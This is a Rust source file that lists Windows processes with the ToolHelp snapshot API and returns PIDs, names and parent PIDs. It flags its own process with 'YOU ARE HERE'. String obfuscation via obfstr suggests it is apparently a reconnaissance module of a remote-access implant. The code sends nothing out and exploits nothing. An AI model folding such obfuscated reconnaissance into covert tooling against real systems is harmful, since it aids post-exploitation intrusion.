use crate::app::win_utils::{get_hostname, get_process_id};
use fmtools::format; // using obfstr to obfuscate
use std::ffi::CStr;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};

fn sz_exe_file_to_string(sz_exe_file: &[u8]) -> String {
    let sz_exe_file_cstr = unsafe { CStr::from_ptr(sz_exe_file.as_ptr().cast::<i8>()) };
    let sz_exe_file_string = sz_exe_file_cstr.to_str().unwrap_or("");
    sz_exe_file_string.to_string()
}

pub(crate) fn ps() -> String {
    let mut result: String = String::new();
    let mut processes: Vec<PROCESSENTRY32> = Vec::new();

    // Print header
    result.push_str(&format!("Process listing for '"{get_hostname()}"'.\n\n"));
    result.push_str(&format!(
        {"PID":<10}
        {"NAME":<50.50}
        {"PPID":<10}
        "\n"
    ));

    // Create process snapshot
    let snapshot = unsafe{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if snapshot == -1 {
        return format!("Failed to create process snapshot: "{std::io::Error::last_os_error()});
    };

    // Iterate through all processes
    let mut process_entry: PROCESSENTRY32 = unsafe{ std::mem::zeroed() };
    process_entry.dwSize = match u32::try_from(std::mem::size_of::<PROCESSENTRY32>()){
        Ok(size) => size,
        Err(_) => return format!("Failed to get size of PROCESSENTRY32: "{std::io::Error::last_os_error()}),
    };

    if unsafe{ Process32First(snapshot, &mut process_entry) } != 0 {
        processes.push(process_entry);
        while unsafe{ Process32Next(snapshot, &mut process_entry) } != 0 {
            processes.push(process_entry);
        }
    } else {
        unsafe{ CloseHandle(snapshot) };
        return format!("Failed to get first process: "{std::io::Error::last_os_error()});
    }
    
    // Format the result
    for process_entry in processes {
        result.push_str(&format!(
            {process_entry.th32ProcessID:<10}
            {sz_exe_file_to_string(&process_entry.szExeFile):<50.50}
            {process_entry.th32ParentProcessID:<10}
        ));

        // Add an indicator if the process is the current process
        if process_entry.th32ProcessID == get_process_id() {
            result.push_str(&format!("<-- YOU ARE HERE"));
        }

        result.push('\n');
    }

    // Cleanup and return
    unsafe { CloseHandle(snapshot) };
    result
}
